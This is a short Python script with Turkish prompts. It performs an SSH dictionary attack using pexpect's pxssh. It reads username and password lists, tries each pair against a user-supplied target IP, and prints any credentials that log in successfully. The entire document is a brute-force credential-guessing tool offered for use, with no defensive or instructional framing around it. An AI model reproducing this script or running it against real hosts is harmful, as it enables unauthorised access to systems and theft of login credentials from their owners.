from pexpect import pxssh
kadidosya=input("kullanıcı adları dosya yolunu belirtiniz: ")
passdosya=input("parola dosya yolunu belirtiniz: ")
host=input("hedef ip adresi: ")
sayac=0
print('\n --->Dictionary Attack Başlıyor<--- \n')
for kadi in open(kadidosya,'r'):
    for pas in open(passdosya,'r'):
        try:            
            payload=pxssh.pxssh()
            payload.login(host,kadi,pas)
            print('\n\ngiris yapildi\nkullanıcı adi--->'+kadi+'parola--->'+pas)
            sayac=1
            break
        except pxssh.ExceptionPxssh as a:
            print('kadi: '+kadi+'password :'+pas+'için başarısız...\n')            
    if  sayac==1:
        break
if sayac==0:
    print('\n--->>>verilen kimlik bilgilerinden hiçbiri uyuşmuyor...')
    


